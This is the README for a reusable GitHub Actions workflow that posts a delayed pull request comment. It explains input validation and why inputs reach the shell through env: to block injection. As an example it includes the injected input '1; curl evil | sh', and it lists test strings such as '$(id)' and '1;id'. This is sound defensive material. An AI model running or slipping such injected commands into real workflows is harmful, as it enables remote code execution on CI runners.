# Delayed pull request comment workflow

`.github/workflows/delayed-pr-comment.yml` is a reusable workflow that waits a
set number of minutes and then posts one comment on a pull request. It replaces
the per-repository copies of `delayed-pr-comment.yml`, which interpolated the
dispatcher's input into shell arithmetic.

## Inputs

| Input           | Type     | Rule                                                           |
| --------------- | -------- | -------------------------------------------------------------- |
| `pr_number`     | `string` | Whole number from 1 to 9999.                                   |
| `delay_minutes` | `string` | Whole number from 0 to 345; leading zeros are read as base 10. |
| `message`       | `string` | The comment body, posted verbatim.                             |

The two numeric inputs are strings on purpose: a number-typed dispatch input
started through the API reaches a number-typed `workflow_call` input as a
string, and GitHub then fails the run before any job starts. Callers still type
their own dispatch inputs as `number`, so GitHub refuses text such as `$(id)`
up front, and the script is the second line of defence.

A value outside these rules fails the first step with an `::error::` naming the
allowed range. Nothing is slept and nothing is posted.

## Limits

- The delay is capped at 345 minutes and the job's `timeout-minutes` is 355.
  GitHub cancels a job at 360 minutes, so a valid delay always finishes and
  leaves the comment step room. A delay is never cut short by an arbitrary
  timeout.
- The job runs on `ubuntu-latest`. It only sleeps, so it never needs a paid
  runner.
- The job holds `pull-requests: write` and nothing else. It does not check out
  code and runs no pull-request code.

## Caller

```yaml
name: delayed-pr-comment
on:
  workflow_dispatch:
    inputs:
      pr_number:
        description: 'PR number to comment on'
        required: true
        type: number
      delay_minutes:
        description: 'Minutes to wait before commenting (0 to 345)'
        required: true
        type: number
      message:
        description: 'Comment body'
        required: true
        type: string

jobs:
  delayed-comment:
    permissions:
      pull-requests: write
    uses: leynos/shared-actions/.github/workflows/delayed-pr-comment.yml@<commit-sha> # <date or version>
    with:
      pr_number: ${{ inputs.pr_number }}
      delay_minutes: ${{ inputs.delay_minutes }}
      message: ${{ inputs.message }}
```

Pin `uses:` to a full commit SHA of `leynos/shared-actions` and record the date
or version in the trailing comment.

## Why inputs go through `env:`

GitHub expands `${{ }}` into the script text before bash parses it. An input
such as `1; curl evil | sh` placed in a `run:` body becomes part of the
program. Every input therefore reaches the shell through a step's `env:`, where
it is data in a variable, and the script validates it before use. The comment
body is written to a temporary file and posted with
`gh pr comment --body-file`, so a message holding shell syntax is posted as
text.

## Tests

`tests/workflows/test_delayed_pr_comment.py` runs both steps' scripts under
bash with stub `sleep`, `gh` and `id` commands. It proves that good input
sleeps the right number of seconds and posts, and that `$(id)`, `1;id`, `-1`,
`1e3`, `346`, an empty value and padded values are rejected without running
anything.
